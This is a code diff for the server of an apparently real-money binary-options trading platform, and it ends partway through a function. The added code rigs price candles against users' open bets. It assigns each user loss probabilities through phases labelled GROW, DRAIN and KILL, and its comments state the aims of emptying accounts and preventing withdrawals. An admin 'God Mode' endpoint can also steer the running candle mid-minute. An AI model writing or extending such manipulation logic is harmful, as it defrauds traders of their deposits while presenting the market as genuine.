@@ -463,6 +463,128 @@ async function initializeNewMarket(marketId) {
     markets[marketId] = { marketId, marketPath: path, history: candles, currentPrice: currentPrice, lastMove: 0 };
 }
 
+
+// =====================================================================
+// 🔥 BULLETPROOF CANDLE STEERING & TRADE CONTROL HELPERS 🔥
+// =====================================================================
+function getActiveTradesForMarket(marketId) {
+    const tradeMap = new Map();
+    const mPath = marketPathFromId(marketId);
+    // 1. From activeTradesDb
+    const fromMarket = activeTradesDb[marketId] || {};
+    for (const tid in fromMarket) {
+        if (fromMarket[tid]) tradeMap.set(tid, { ...fromMarket[tid], id: tid, marketId: marketId });
+    }
+    // 2. From usersCache
+    for (const uid in usersCache) {
+        const u = usersCache[uid];
+        if (u && u.activeTrades) {
+            for (const tid in u.activeTrades) {
+                const ut = u.activeTrades[tid];
+                if (!ut) continue;
+                const uMarketPath = marketPathFromId(ut.marketId || ut.market || ut.asset);
+                if (ut.marketId === marketId || ut.market === marketId || uMarketPath === mPath) {
+                    tradeMap.set(tid, { ...ut, uid, id: tid, marketId: marketId });
+                }
+            }
+        }
+    }
+    return Array.from(tradeMap.values()).filter(t => !t.isDemo && !t.isTournament);
+}
+
+function getCommandBias(cmd, cloneData) {
+    if (cmd === 'CUSTOM_CLONE' && cloneData) {
+        return cloneData.isGreen ? 'GREEN' : 'RED';
+    }
+    if (!cmd) return 'NATURAL';
+    const c = String(cmd).toUpperCase();
+    if (c === 'DOJI') return 'DOJI';
+    if (c.includes('GREEN') || c.includes('BULLISH') || c.includes('WHITE_SOLDIERS') || c.includes('PIERCING') || c.includes('MORNING_STAR') || c.includes('THREE_INSIDE_UP') || c === 'PREV_2X') {
+        return 'GREEN';
+    }
+    if (c.includes('RED') || c.includes('BEARISH') || c.includes('BLACK_CROWS') || c.includes('DARK_CLOUD') || c.includes('EVENING_STAR') || c.includes('THREE_INSIDE_DOWN')) {
+        return 'RED';
+    }
+    return 'GREEN';
+}
+
+function adjustTargetCloseForTrades(open, originalTargetClose, bias, expiringTrades) {
+    const margin = open * 0.00008; // unambiguous buffer
+    let target = originalTargetClose;
+
+    if (bias === 'RED') {
+        // Must close RED
+        target = Math.min(target, open - margin);
+        if (expiringTrades && expiringTrades.length > 0) {
+            expiringTrades.forEach(t => {
+                const op = parseFloat(t.openPrice);
+                if (!isNaN(op) && op > 0) {
+                    // UP bets lose if close < openPrice; DOWN bets win if close < openPrice
+                    target = Math.min(target, op - margin);
+                }
+            });
+        }
+    } else if (bias === 'GREEN') {
+        // Must close GREEN
+        target = Math.max(target, open + margin);
+        if (expiringTrades && expiringTrades.length > 0) {
+            expiringTrades.forEach(t => {
+                const op = parseFloat(t.openPrice);
+                if (!isNaN(op) && op > 0) {
+                    // DOWN bets lose if close > openPrice; UP bets win if close > openPrice
+                    target = Math.max(target, op + margin);
+                }
+            });
+        }
+    } else if (bias === 'DOJI') {
+        target = open + (Math.random() > 0.5 ? 0.00001 : -0.00001);
+    }
+
+    return roundPrice(target);
+}
+
+function steerCandleToTarget(candle, currentPrice, newTargetClose, bias) {
+    candle.targetClose = roundPrice(newTargetClose);
+    const spread = Math.abs(candle.targetClose - candle.open);
+    const wick = Math.max(candle.open * 0.00003, spread * 0.25);
+
+    if (bias === 'GREEN') {
+        candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.targetClose + wick));
+        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.open - (wick * 0.5)));
+    } else if (bias === 'RED') {
+        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.targetClose - wick));
+        candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.open + (wick * 0.5)));
+    } else {
+        candle.targetHigh = roundPrice(Math.max(candle.targetHigh || candle.open, candle.open + wick));
+        candle.targetLow = roundPrice(Math.min(candle.targetLow || candle.open, candle.open - wick));
+    }
+
+    const now = Date.now();
+    const timeElapsed = Math.max(0, now - candle.timestamp);
+    const progress = Math.min(timeElapsed / TIMEFRAME, 1.0);
+    const numWaypoints = 15;
+    const currentWaypointIndex = Math.min(Math.floor(progress * (numWaypoints - 1)), numWaypoints - 2);
+
+    candle.isPredetermined = true;
+    if (!candle.waypoints || candle.waypoints.length < numWaypoints) {
+        candle.waypoints = new Array(numWaypoints).fill(candle.open);
+    }
+    candle.waypoints[currentWaypointIndex] = currentPrice;
+
+    const remainingSteps = (numWaypoints - 1) - currentWaypointIndex;
+    for (let i = 1; i <= remainingSteps; i++) {
+        const stepProgress = i / remainingSteps;
+        let wp = currentPrice + (candle.targetClose - currentPrice) * stepProgress;
+        if (i < remainingSteps) {
+            const jitter = (Math.random() - 0.5) * (candle.open * 0.00002);
+            wp += jitter;
+        }
+        candle.waypoints[currentWaypointIndex + i] = roundPrice(wp);
+    }
+    candle.highIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.3)));
+    candle.lowIdx = Math.min(numWaypoints - 2, currentWaypointIndex + Math.max(1, Math.floor(remainingSteps * 0.7)));
+}
+
 // 🔥 CORE AI LOGIC: Multi-Timeframe + Rollercoaster Engine with Dynamic Transition Buffer 🔥
 function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     let lastCandle = marketData.history[marketData.history.length - 1];
@@ -471,38 +593,50 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
     if (currentPeriod > lastCandle.timestamp) {
         let newCandle;
 
-        // Multi-Candle Pattern Queue Processing
+        const activeTrades = getActiveTradesForMarket(marketData.marketId);
+        const nextPeriod = currentPeriod + TIMEFRAME;
+        const expiringTrades = activeTrades.filter(t => t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000 && t.expiryTimestamp > currentPeriod);
+
+        // 1. Manual Admin Override (Pattern Queue or Single Command) - 100% HIGHEST PRIORITY
         if (marketData.nextCandleQueue && marketData.nextCandleQueue.length > 0) {
             const spec = marketData.nextCandleQueue.shift();
             newCandle = generatePatternCandle(currentPeriod, lastCandle.close, spec);
+            newCandle.isAdminCommand = true;
+            const bias = spec.direction === 'RED' ? 'RED' : 'GREEN';
+            newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, bias, expiringTrades);
+            if (bias === 'RED') {
+                newCandle.targetLow = roundPrice(Math.min(newCandle.targetLow, newCandle.targetClose - (newCandle.open * 0.00003)));
+            } else {
+                newCandle.targetHigh = roundPrice(Math.max(newCandle.targetHigh, newCandle.targetClose + (newCandle.open * 0.00003)));
+            }
         }
-        // Manual Admin Override (single candle)
         else if (marketData.nextCandleCommand) {
-            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, marketData.nextCandleCommand, marketData.nextCandleCloneData);
+            const cmd = marketData.nextCandleCommand;
+            const clone = marketData.nextCandleCloneData;
+            newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, cmd, clone);
+            newCandle.isAdminCommand = true;
+            const bias = getCommandBias(cmd, clone);
+            newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, bias, expiringTrades);
+            if (bias === 'RED') {
+                newCandle.targetLow = roundPrice(Math.min(newCandle.targetLow, newCandle.targetClose - (newCandle.open * 0.00003)));
+            } else {
+                newCandle.targetHigh = roundPrice(Math.max(newCandle.targetHigh, newCandle.targetClose + (newCandle.open * 0.00003)));
+            }
             marketData.nextCandleCommand = null;
             marketData.nextCandleCloneData = null;
         }
 
-        // Smart Auto Pilot (Rollercoaster & Volume Edge)
+        // 2. Smart Auto Pilot (Rollercoaster & Volume Edge)
         if (!newCandle && SMART_AUTO_PILOT) {
-            const trades = activeTradesDb[marketData.marketId] || {};
             let totalUp = 0, totalDown = 0;
             let uniqueUsers = new Set();
             let singleUserId = null;
 
-            const nextPeriod = currentPeriod + TIMEFRAME;
-
-            // Check trades expiring EXACTLY at the end of this current minute
-            Object.values(trades).forEach(t => {
-                const isDemo = t.isDemo === true || t.isTournament === true;
-                if (!isDemo) {
-                    if (t.expiryTimestamp && t.expiryTimestamp <= nextPeriod + 2000 && t.expiryTimestamp > currentPeriod) {
-                        uniqueUsers.add(t.uid);
-                        singleUserId = t.uid;
-                        if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
-                        if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
-                    }
-                }
+            expiringTrades.forEach(t => {
+                uniqueUsers.add(t.uid);
+                singleUserId = t.uid;
+                if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
+                if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
             });
 
             let targetDirection = 'DOJI';
@@ -518,93 +652,118 @@ function ensureCurrentPeriodCandle(marketData, currentPeriod) {
                 else targetDirection = Math.random() > 0.5 ? 'GREEN' : 'RED';
             }
             else if (uniqueUsers.size === 1) {
-                // Single User -> Rollercoaster Trail Logic with Dynamic Transition Buffer
+                // Single User -> Rollercoaster Trail Logic strictly on TOTAL BALANCE (Real + Bonus)
                 const uData = usersCache[singleUserId];
                 let forceLoss = false;
                 let lossProbability = 0.65; // Default
 
-                if (uData && uData.tradeTrail) {
-                    const trail = uData.tradeTrail;
-                    const currentBal = (parseFloat(uData.realBalance) || 0) + (parseFloat(uData.bonusBalance) || 0);
-                    const potentialWinBal = currentBal + ((totalUp + totalDown) * 0.85);
+                const realBal = parseFloat(uData?.realBalance || 0);
+                const bonusBal = parseFloat(uData?.bonusBalance || 0);
+                const currentBal = realBal + bonusBal;
+                const totalBet = totalUp + totalDown;
+                const preTradeBal = currentBal + totalBet;
+                const potentialWinBal = currentBal + (totalBet * 1.85);
+
+                let trail = uData?.tradeTrail;
+                if (!trail && preTradeBal > 0) {
+                    const isUnder65 = preTradeBal < 65;
+                    trail = {
+                        baseBalance: preTradeBal,
+                        highestSeenBalance: preTradeBal,
+                        phase: 1,
+                        isUnder65: isUnder65,
+                        targetBalance: isUnder65 ? (preTradeBal * 1.20) : (preTradeBal * 0.40)
+                    };
+                    db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+                    if (uData) uData.tradeTrail = trail;
+                } else if (trail && preTradeBal > (trail.highestSeenBalance || 0) + 2) {
+                    const isUnder65 = preTradeBal < 65;
+                    trail.baseBalance = preTradeBal;
+                    trail.highestSeenBalance = preTradeBal;
+                    trail.phase = 1;
+                    trail.isUnder65 = isUnder65;
+                    trail.targetBalance = isUnder65 ? (preTradeBal * 1.20) : (preTradeBal * 0.40);
+                    db.ref(`users/${singleUserId}/tradeTrail`).set(trail).catch(()=>{});
+                    if (uData) uData.tradeTrail = trail;
+                }
+
+                if (trail) {
+                    if (preTradeBal > (trail.highestSeenBalance || 0)) {
+                        trail.highestSeenBalance = preTradeBal;
+                        db.ref(`users/${singleUserId}/tradeTrail/highestSeenBalance`).set(preTradeBal).catch(()=>{});
+                    }
 
                     if (trail.isUnder65) {
                         if (trail.phase === 1) {
-                            // Phase 1 (GROW): বাফার টার্গেটের বেশি বড় বেট ধরলে ফোর্স লস
-                            if (potentialWinBal > trail.targetBalance * 1.5) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05; // ৯০% উইন বায়াস যাতে সে সহজে টার্গেট ক্রস করে ফেজ ২ এ যায়
-                            } else {
-                                lossProbability = 0.40; // নরমাল ট্রেডে ৬০% উইন বায়াস
-                            }
-                        } else if (trail.phase === 2) {
-                            // Phase 2 (DRAIN): ৬০% ব্যালেন্স টানা লস করানো
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 3) {
-                            // Phase 3 (GROW): ৫০% রিকভারি প্রলোভন
-                            if (potentialWinBal > trail.targetBalance * 1.5) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05; // টার্গেট পার করিয়ে দেওয়া
-                            } else {
-                                lossProbability = 0.40;
-                            }
-                        } else if (trail.phase === 4) {
-                            // Phase 4 (KILL): ব্যালেন্স জিরো করা
-                            lossProbability = 0.90;
-                        }
-                    } else {
-                        // $৬৫ এর উপরে বড় ব্যালেন্স অ্যাকাউন্ট ট্রেইল
-                        if (trail.phase === 1) {
-                            // Phase 1: ইনস্ট্যান্ট ৬০% লস দিয়ে ফেলা যাতে উইথড্র করতে না পারে
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 2) {
-                            // Phase 2 (GROW): ৫০% ব্যালেন্স রিকভারি দেওয়া
-                            if (potentialWinBal > trail.targetBalance * 1.5) {
-                                forceLoss = true;
-                            } else if (potentialWinBal >= trail.targetBalance) {
-                                lossProbability = 0.05; // টার্গেট পার করানো
-                            } else {
-                                lossProbability = 0.40;
-                            }
-                        } else if (trail.phase === 3) {
-                            // Phase 3 (DRAIN): ৭০% ব্যালেন্স লস
-                            lossProbability = 0.85;
-                        } else if (trail.phase === 4) {
-                            // Phase 4 (GROW): ১৫% ছোট রিকভারি
-                            if (potentialWinBal > trail.targetBalance * 1.5) {
+                            if (potentialWinBal > trail.targetBalance * 2.0) {
                                 forceLoss = true;
                             } else if (potentialWinBal >= trail.targetBalance) {
                                 lossProbability = 0.05;
                             } else {
-                                lossProbability = 0.40;
+                                lossProbability = 0.35;
+                            }
+                        } else if (trail.phase === 2) {
+                            lossProbability = 0.85;
+                        } else if (trail.phase === 3) {
+                            if (potentialWinBal > trail.targetBalance * 2.0) {
+                                forceLoss = true;
+                            } else if (potentialWinBal >= trail.targetBalance) {
+                                lossProbability = 0.05;
+                            } else {
+                                lossProbability = 0.35;
+                            }
+                        } else if (trail.phase === 4) {
+                            lossProbability = 0.90;
+                        }
+                    } else {
+                        if (trail.phase === 1) {
+                            lossProbability = 0.85;
+                        } else if (trail.phase === 2) {
+                            if (potentialWinBal > trail.targetBalance * 2.0) {
+                                forceLoss = true;
+                            } else if (potentialWinBal >= trail.targetBalance) {
+                                lossProbability = 0.05;
+                            } else {
+                                lossProbability = 0.35;
+                            }
+                        } else if (trail.phase === 3) {
+                            lossProbability = 0.85;
+                        } else if (trail.phase === 4) {
+                            if (potentialWinBal > trail.targetBalance * 2.0) {
+                                forceLoss = true;
+                            } else if (potentialWinBal >= trail.targetBalance) {
+                                lossProbability = 0.05;
+                            } else {
+                                lossProbability = 0.35;
                             }
                         } else if (trail.phase === 5) {
-                            // Phase 5 (KILL): সম্পূর্ণ অ্যাকাউন্ট খালি করা
                             lossProbability = 0.90;
                         }
                     }
                 } else {
-                    // Fallback to basic PnL tracking if trail isn't created yet
                     let dp = (uData && uData.dailyProfit) ? uData.dailyProfit : 0;
                     if (dp > 20) lossProbability = 0.85;
                     else if (dp > 0) lossProbability = 0.75;
                     else if (dp < -100) lossProbability = 0.35;
                     else if (dp < -50) lossProbability = 0.50;
-                    else lossProbability = 0.65;
+                    else lossProbability = 0.50;
                 }
 
                 if (!forceLoss) forceLoss = Math.random() < lossProbability;
 
-                const userPrimaryDirection = totalUp > totalDown ? 'UP' : 'DOWN';
+                const userPrimaryDirection = totalUp >= totalDown ? 'UP' : 'DOWN';
                 targetDirection = forceLoss ? (userPrimaryDirection === 'UP' ? 'RED' : 'GREEN') : (userPrimaryDirection === 'UP' ? 'GREEN' : 'RED');
             }
 
             if (targetDirection !== 'NATURAL') {
                 newCandle = generateDynamicCandle(currentPeriod, lastCandle.close, targetDirection);
                 newCandle.isAdminCommand = false;
-                newCandle.targetClose += (Math.random() - 0.5) * (lastCandle.close * 0.00003);
+                newCandle.targetClose = adjustTargetCloseForTrades(newCandle.open, newCandle.targetClose, targetDirection, expiringTrades);
+                if (targetDirection === 'RED') {
+                    newCandle.targetLow = roundPrice(Math.min(newCandle.targetLow, newCandle.targetClose - (newCandle.open * 0.00003)));
+                } else {
+                    newCandle.targetHigh = roundPrice(Math.max(newCandle.targetHigh, newCandle.targetClose + (newCandle.open * 0.00003)));
+                }
             }
         }
 
@@ -722,17 +881,44 @@ app.get('/api/history/:marketId', (req, res) => {
 app.post('/api/admin/command', async (req, res) => {
     const { marketId, command, cloneData } = req.body;
     if (markets[marketId]) {
+        const market = markets[marketId];
+        const bias = getCommandBias(command, cloneData);
+
+        // Store active admin command
+        market.activeAdminCommand = {
+            command,
+            cloneData: cloneData || null,
+            bias,
+            timestamp: Date.now()
+        };
+
         // Check if it's a multi-candle pattern
         if (MULTI_CANDLE_PATTERNS[command]) {
-            markets[marketId].nextCandleQueue = MULTI_CANDLE_PATTERNS[command].map(s => ({...s, patternName: command}));
-            markets[marketId].nextCandleCommand = null;
-            markets[marketId].nextCandleCloneData = null;
+            market.nextCandleQueue = MULTI_CANDLE_PATTERNS[command].map(s => ({...s, patternName: command}));
+            market.nextCandleCommand = null;
+            market.nextCandleCloneData = null;
         } else {
-            markets[marketId].nextCandleCommand = command;
+            market.nextCandleCommand = command;
             if (cloneData) {
-                markets[marketId].nextCandleCloneData = cloneData;
+                market.nextCandleCloneData = cloneData;
             }
-            markets[marketId].nextCandleQueue = null;
+            market.nextCandleQueue = null;
+        }
+
+        // 🔥 INSTANT MID-CANDLE INTERVENTION: Steer currently running candle immediately 🔥
+        if (market.history && market.history.length > 0) {
+            const currentCandle = market.history[market.history.length - 1];
+            const now = Date.now();
+            if (now < currentCandle.timestamp + TIMEFRAME) {
+                currentCandle.isAdminCommand = true;
+                currentCandle.pattern = command;
+
+                const activeTrades = getActiveTradesForMarket(marketId);
+                const expiringTrades = activeTrades.filter(t => t.expiryTimestamp && t.expiryTimestamp <= currentCandle.timestamp + TIMEFRAME + 2000);
+
+                const adjustedClose = adjustTargetCloseForTrades(currentCandle.open, currentCandle.targetClose || currentCandle.open, bias, expiringTrades);
+                steerCandleToTarget(currentCandle, market.currentPrice, adjustedClose, bias);
+            }
         }
         
         let tgMsg = `🛠 <b>God Mode Command Executed</b>\n\n`;
@@ -742,7 +928,6 @@ app.post('/api/admin/command', async (req, res) => {
             tgMsg += `🎨 <b>Clone Details:</b> ${cloneData.isGreen ? 'Green' : 'Red'} | Body: ${cloneData.body} | U: ${cloneData.upperWick} | L: ${cloneData.lowerWick}\n`;
         }
         
-        // টেলিগ্রামে মেসেজ পাঠানো (যেখানে অন্যান্য এডমিন এলার্ট যায়)
         sendTgMessage(tgMsg);
 
         res.json({ success: true });
@@ -767,6 +952,72 @@ setInterval(() => {
         let candle = ensureCurrentPeriodCandle(marketData, currentPeriod);
         if (!candle) continue;
 
+        // 🔥 Dynamic Mid-Candle Trade Steering (When user enters mid-minute) 🔥
+        if (!candle.isAdminCommand && !candle.hasMidCandleSteered && SMART_AUTO_PILOT) {
+            const activeTrades = getActiveTradesForMarket(marketId);
+            const expiringTrades = activeTrades.filter(t => t.expiryTimestamp && t.expiryTimestamp <= currentPeriod + TIMEFRAME + 2000 && t.expiryTimestamp > currentPeriod);
+            if (expiringTrades.length > 0) {
+                let totalUp = 0, totalDown = 0;
+                const uniqueUsers = new Set();
+                let singleUserId = null;
+                expiringTrades.forEach(t => {
+                    uniqueUsers.add(t.uid);
+                    singleUserId = t.uid;
+                    if (t.direction === 'UP') totalUp += parseFloat(t.amount || 0);
+                    if (t.direction === 'DOWN') totalDown += parseFloat(t.amount || 0);
+                });
+
+                let targetDir = 'RED';
+                if (uniqueUsers.size > 1) {
+                    targetDir = totalUp > totalDown ? 'RED' : (totalDown > totalUp ? 'GREEN' : (Math.random() > 0.5 ? 'GREEN' : 'RED'));
+                } else if (uniqueUsers.size === 1) {
+                    const uData = usersCache[singleUserId];
+                    const realBal = parseFloat(uData?.realBalance || 0);
+                    const bonusBal = parseFloat(uData?.bonusBalance || 0);
+                    const currentBal = realBal + bonusBal;
+                    const totalBet = totalUp + totalDown;
+                    const preTradeBal = currentBal + totalBet;
+                    const potentialWinBal = currentBal + (totalBet * 1.85);
+                    let trail = uData?.tradeTrail;
+                    let forceLoss = false;
+                    let lossProbability = 0.65;
+                    if (trail) {
+                        if (trail.isUnder65) {
+                            if (trail.phase === 1) {
+                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
+                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
+                                else lossProbability = 0.35;
+                            } else if (trail.phase === 2) lossProbability = 0.85;
+                            else if (trail.phase === 3) {
+                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
+                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
+                                else lossProbability = 0.35;
+                            } else if (trail.phase === 4) lossProbability = 0.90;
+                        } else {
+                            if (trail.phase === 1) lossProbability = 0.85;
+                            else if (trail.phase === 2) {
+                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
+                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
+                                else lossProbability = 0.35;
+                            } else if (trail.phase === 3) lossProbability = 0.85;
+                            else if (trail.phase === 4) {
+                                if (potentialWinBal > trail.targetBalance * 2.0) forceLoss = true;
+                                else if (potentialWinBal >= trail.targetBalance) lossProbability = 0.05;
+                                else lossProbability = 0.35;
+                            } else if (trail.phase === 5) lossProbability = 0.90;
+                        }
+                    }
+                    if (!forceLoss) forceLoss = Math.random() < lossProbability;
+                    const userDir = totalUp >= totalDown ? 'UP' : 'DOWN';
+                    targetDir = forceLoss ? (userDir === 'UP' ? 'RED' : 'GREEN') : (userDir === 'UP' ? 'GREEN' : 'RED');
+                }
+
+                const adjustedClose = adjustTargetCloseForTrades(candle.open, candle.targetClose || candle.open, targetDir, expiringTrades);
+                steerCandleToTarget(candle, marketData.currentPrice, adjustedClose, targetDir);
+                candle.hasMidCandleSteered = true;
+            }
+        }
+
         updateRealisticPrice(marketData, candle, currentPeriod);
         broadcastCandle(marketId, candle);
     }
@@ -783,7 +1034,6 @@ setInterval(() => {
         if (Object.keys(batchUpdates).length > 0) db.ref().update(batchUpdates).catch(() => { });
     }
 }, TICK_MS);
-
 
 // =====================================================================
 // SERVER-SIDE TRADE RESOLUTION & TELEGRAM NOTIFICATION ENGINE
@@ -1050,7 +1300,9 @@ setInterval(async () => {
                 // ১. টেলিগ্রামে ওপেনিং ট্রেড নোটিফিকেশন পাঠানো (একবারই পাঠাবে)
                 if (!trade.tgMessageId && !trade.isDemo && !trade.isTournament) {
                     processingTrades.add(tradeId); // লক
-                    let currentBal = parseFloat(user.realBalance || 0);
+                    let realBal = parseFloat(user.realBalance || 0);
+                    let bonusBal = parseFloat(user.bonusBalance || 0);
+                    let currentBal = realBal + bonusBal;
                     let previousBal = currentBal + parseFloat(trade.amount || 0);
                     let expWinBal = currentBal + (trade.amount * payoutRate);
 
@@ -1061,10 +1313,10 @@ setInterval(async () => {
                         `⏱ <b>Duration:</b> ${trade.expiryType === 'time' ? trade.expiryType : 'Seconds'}\n` +
                         `📊 <b>Direction:</b> ${trade.direction}\n` +
                         `💵 <b>Amount:</b> $${trade.amount}\n` +
-                        `⏮ <b>Previous Balance:</b> $${previousBal.toFixed(2)}\n` +
-                        `💰 <b>Current Balance:</b> $${currentBal.toFixed(2)}\n\n` +
-                        `💸 <b>Balance if Win:</b> $${expWinBal.toFixed(2)}\n` +
-                        `💸 <b>Balance if Loss:</b> $${currentBal.toFixed(2)}`;
+                        `⏮ <b>Previous Total Balance:</b> $${previousBal.toFixed(2)}\n` +
+                        `💰 <b>Current Total Balance:</b> $${currentBal.toFixed(2)} (Real: $${realBal.toFixed(2)} | Bonus: $${bonusBal.toFixed(2)})\n\n` +
+                        `💸 <b>Total Balance if Win:</b> $${expWinBal.toFixed(2)}\n` +
+                        `💸 <b>Total Balance if Loss:</b> $${currentBal.toFixed(2)}`;
 
                     sendTgMessage(msg).then(msgId => {
                         if (msgId) {
@@ -1081,50 +1333,71 @@ setInterval(async () => {
 
                     let closingPrice = trade.lockedClosingPrice;
                     if (!closingPrice) {
-                        closingPrice = trade.openPrice;
                         const mId = trade.marketId;
-                        if (markets[mId] && markets[mId].currentPrice) {
-                            closingPrice = markets[mId].currentPrice;
+                        const market = markets[mId];
+                        if (market && market.history && market.history.length > 0) {
+                            // Find the exact candle that ended at trade.expiryTimestamp
+                            let candle = market.history.find(c => Math.abs((c.timestamp + TIMEFRAME) - trade.expiryTimestamp) < 2500);
+                            if (!candle) {
+                                candle = market.history.find(c => trade.expiryTimestamp >= c.timestamp && trade.expiryTimestamp <= (c.timestamp + TIMEFRAME + 1000));
+                            }
+                            if (candle) {
+                                closingPrice = candle.close;
+                            } else {
+                                closingPrice = market.currentPrice || parseFloat(trade.openPrice);
+                            }
+                        } else {
+                            closingPrice = parseFloat(trade.openPrice);
                         }
                         trade.lockedClosingPrice = closingPrice;
                         db.ref(`users/${uid}/activeTrades/${tradeId}/lockedClosingPrice`).set(closingPrice).catch(()=>{});
                     }
 
                     const betAmount = parseFloat(trade.amount);
-                    const diff = closingPrice - trade.openPrice;
+                    const openPrice = parseFloat(trade.openPrice);
+                    const diff = closingPrice - openPrice;
+                    const precision = 0.000001;
 
                     let result = 'push', payout = betAmount, profitChange = 0;
-                    if (Math.abs(diff) < 1e-6) {
-                        const randomEdge = Math.random() > 0.5 ? 0.00001 : -0.00001;
-                        closingPrice += randomEdge;
-                        const newDiff = closingPrice - trade.openPrice;
-                        if ((newDiff > 0 && trade.direction === 'UP') || (newDiff < 0 && trade.direction === 'DOWN')) {
-                            result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
-                        } else {
-                            result = 'loss'; payout = 0; profitChange = -betAmount;
-                        }
-                    } else if ((diff > 0 && trade.direction === 'UP') || (diff < 0 && trade.direction === 'DOWN')) {
-                        result = 'win'; payout = betAmount * payoutRate; profitChange = payout - betAmount;
+                    if (Math.abs(diff) <= precision) {
+                        result = 'push';
+                        payout = betAmount;
+                        profitChange = 0;
+                    } else if ((diff > precision && trade.direction === 'UP') || (diff < -precision && trade.direction === 'DOWN')) {
+                        result = 'win';
+                        payout = betAmount * payoutRate;
+                        profitChange = payout - betAmount;
                     } else {
-                        result = 'loss'; payout = 0; profitChange = -betAmount;
+                        result = 'loss';
+                        payout = 0;
+                        profitChange = -betAmount;
                     }
 
                     // ব্যাচ আপডেট অবজেক্ট
                     const updates = {};
+                    let updatedRealBal = parseFloat(user.realBalance || 0);
+                    let updatedBonusBal = parseFloat(user.bonusBalance || 0);
+
                     if (!trade.isDemo && !trade.isTournament) {
                         const realAmt = parseFloat(trade.realAmount) || 0;
                         const bonusAmt = parseFloat(trade.bonusAmount) || 0;
                         
+                        let toBonus = 0;
+                        let toReal = 0;
+
                         if (result === 'push') {
-                            if (realAmt > 0) updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(realAmt);
-                            if (bonusAmt > 0) updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(bonusAmt);
+                            if (realAmt > 0) {
+                                updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(realAmt);
+                                updatedRealBal += realAmt;
+                            }
+                            if (bonusAmt > 0) {
+                                updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(bonusAmt);
+                                updatedBonusBal += bonusAmt;
+                            }
                         } else if (result === 'win') {
                             const maxB = parseFloat(user.maxBonusLimit) || 0;
                             const curB = parseFloat(user.bonusBalance) || 0;
                             let refillNeeded = Math.max(0, maxB - curB);
-                            
-                            let toBonus = 0;
-                            let toReal = 0;
                             
                             if (payout <= refillNeeded) {
                                 toBonus = payout;
@@ -1133,8 +1406,14 @@ setInterval(async () => {
                                 toReal = payout - refillNeeded;
                             }
                             
-                            if (toBonus > 0) updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(toBonus);
-                            if (toReal > 0) updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(toReal);
+                            if (toBonus > 0) {
+                                updates[`users/${uid}/bonusBalance`] = firebase.database.ServerValue.increment(toBonus);
+                                updatedBonusBal += toBonus;
+                            }
+                            if (toReal > 0) {
+                                updates[`users/${uid}/realBalance`] = firebase.database.ServerValue.increment(toReal);
+                                updatedRealBal += toReal;
+                            }
                         }
                         
                         updates[`users/${uid}/totalProfitLoss`] = firebase.database.ServerValue.increment(profitChange);
@@ -1151,12 +1430,75 @@ setInterval(async () => {
                             user.dailyProfit = (parseFloat(user.dailyProfit) || 0) + profitChange;
                         }
 
+                        // 🔥 ট্রেইল ফেজ ট্র্যাকিং ও আপডেট (রিয়েল + বোনাস মিলিয়ে টোটাল ব্যালেন্সের উপর) 🔥
+                        const newTotalBal = Math.max(0, updatedRealBal + updatedBonusBal);
+                        let trail = user.tradeTrail;
+                        if (!trail && newTotalBal > 0) {
+                            const isUnder65 = newTotalBal < 65;
+                            trail = {
+                                baseBalance: newTotalBal,
+                                highestSeenBalance: newTotalBal,
+                                phase: 1,
+                                isUnder65: isUnder65,
+                                targetBalance: isUnder65 ? (newTotalBal * 1.20) : (newTotalBal * 0.40)
+                            };
+                            updates[`users/${uid}/tradeTrail`] = trail;
+                            user.tradeTrail = trail;
+                        } else if (trail) {
+                            let needsTrailUpdate = false;
+                            if (newTotalBal > (trail.highestSeenBalance || 0)) {
+                                trail.highestSeenBalance = newTotalBal;
+                                needsTrailUpdate = true;
+                            }
+                            if (trail.isUnder65) {
+                                if (trail.phase === 1) {
+                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
+                                        trail.phase = 2; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 0.40; needsTrailUpdate = true;
+                                    }
+                                } else if (trail.phase === 2) {
+                                    if (newTotalBal <= trail.targetBalance || newTotalBal >= trail.baseBalance * 1.50) {
+                                        trail.phase = 3; trail.baseBalance = newTotalBal; trail.targetBalance = trail.baseBalance * 1.50; needsTrailUpdate = true;
+                                    }
+                                } else if (trail.phase === 3) {
+                                    if (newTotalBal >= trail.targetBalance || newTotalBal <= trail.baseBalance * 0.50) {
+                                        trail.phase = 4; trail.baseBalance = newTotalBal; trail.targetBalance = 0; needsTrailUpdate = true;
